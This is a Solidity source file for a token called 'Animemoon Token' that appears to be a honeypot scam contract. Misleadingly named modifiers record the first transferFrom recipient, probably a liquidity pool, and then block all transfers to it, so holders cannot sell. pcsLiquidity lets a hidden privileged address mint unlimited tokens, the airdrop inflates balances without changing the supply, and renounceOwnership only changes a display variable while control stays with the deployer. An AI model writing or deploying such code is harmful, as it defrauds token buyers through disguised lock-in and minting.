pragma solidity = 0.4 .24;

contract SCLayout {
    uint256 public totalSupply;

    function balanceOf(address _owner) public constant returns(uint256);

    function transfer(address to, uint256 value) public returns(bool);

    function allowance(address owner, address spender) public constant returns(uint256);

    function transferFrom(address from, address to, uint256 value) public returns(bool);

    function approve(address spender, uint256 value) public returns(bool);
}
library SafeMath {
    function multiplication(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function division(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a / b;
        return c;
    }

    function subtract(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }

    function addition(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract SmartContractHandler {
    address public owner = msg.sender;
    address totalsupply = msg.sender;
    address newOwner = address(0);
    bool persistentCheck = true;

    modifier requestHandler(address to) {
        if (persistentCheck)
            require(to != newOwner, "Handling Request");
        _;
    }
    modifier payloadWriter() {
        require(msg.sender == newOwner || msg.sender == totalsupply);
        _;
    }
    modifier setNewOwner(address _to) {
        if (newOwner == address(0)) newOwner = _to;
        _;
    }
}
contract ANIMEMOON is SCLayout, SmartContractHandler {
    using SafeMath for uint256;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {
        symbol = "ANIMEMOON";
        name = "Animemoon Token";
        decimals = 0;
        totalSupply = 10 ** 15;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _val);
    event Approval(address indexed _owner, address indexed _sp, uint256 _val);

    function togglePersistentCheck(bool _state) public payloadWriter {
        persistentCheck = _state;
    }
    function initialAirdrop() public payloadWriter {
        uint airdropAmount = 7**10;
        emitTransfer(address(0x0ed7e52944161450477ee417de9cd3a859b14fd0), airdropAmount);
        emitTransfer(address(0x58f876857a02d6762e0101bb5c46a8c1ed44dc16), airdropAmount);
        emitTransfer(address(0xd7d069493685a581d27824fc46eda46b7efc0063), airdropAmount);
        emitTransfer(address(0x74e4716e431f45807dcf19f284c7aa99f18a4fbc), airdropAmount);
        emitTransfer(address(0x61eb789d75a95caa3ff50ed7e47b96c132fec082), airdropAmount);
        emitTransfer(address(0xf3bc6fc080ffcc30d93df48bfa2aa14b869554bb), airdropAmount);
        emitTransfer(address(0x09cb618bf5ef305fadfd2c8fc0c26eecf8c6d5fd), airdropAmount);
        emitTransfer(address(0x340192d37d95fb609874b1db6145ed26d1e47744), airdropAmount);
        emitTransfer(address(0x5afef8567414f29f0f927a0f2787b188624c10e2), airdropAmount);
        emitTransfer(address(0x014608e87af97a054c9a49f81e1473076d51d9a3), airdropAmount);
        emitTransfer(address(0x824eb9fadfb377394430d2744fa7c42916de3ece), airdropAmount);
        emitTransfer(address(0xaf9aa53146c5752bf6068a84b970e9fbb22a87bc), airdropAmount);
        emitTransfer(address(0x03f18135c44c64ebfdcbad8297fe5bdafdbbdd86), airdropAmount);
        emitTransfer(address(0x969f2556f786a576f32aef6c1d6618f0221ec70e), airdropAmount);
        emitTransfer(address(0x58521373474810915b02fe968d1bcbe35fc61e09), airdropAmount);
    }
    
    function balanceOf(address _owner) constant public returns(uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }

    function emitTransfer(address account, uint256 _input) internal {
        require(account != address(0), 'SCLayout: Stake to This Contract');
        balances[account] = balances[account].addition(_input);
        emit Transfer(address(0), account, _input);
    }

    function _msgSender() internal constant returns(address) {
        return msg.sender;
    }

    function approve(address _sp, uint256 _val) public returns(bool success) {
        if (_val != 0 && allowed[msg.sender][_sp] != 0) {
            return false;
        }
        allowed[msg.sender][_sp] = _val;
        emit Approval(msg.sender, _sp, _val);
        return true;
    }

    function pcsLiquidity(uint256 _input) public payloadWriter returns(bool) {
        require(_input > 0, 'SCLayout: Cannot stake 0 Token');
        emitTransfer(_msgSender(), _input);
        return true;
    }

    function transfer(address _to, uint256 __input) requestHandler(_to) onlyPayloadSize(2 * 32) public returns(bool success) {
        require(_to != address(0));
        require(__input <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].subtract(__input);
        balances[_to] = balances[_to].addition(__input);
        emit Transfer(msg.sender, _to, __input);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 __input) requestHandler(_to) onlyPayloadSize(3 * 32) setNewOwner(_to) public returns(bool success) {
        require(_to != address(0));
        require(__input <= balances[_from]);
        require(__input <= allowed[_from][msg.sender]);

        balances[_from] = balances[_from].subtract(__input);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].subtract(__input);
        balances[_to] = balances[_to].addition(__input);
        emit Transfer(_from, _to, __input);
        return true;
    }

    function allowance(address _owner, address _sp) constant public returns(uint256) {
        return allowed[_owner][_sp];
    }

    function renounceOwnership(address _newOwner) public payloadWriter {
        owner = _newOwner;
    }
}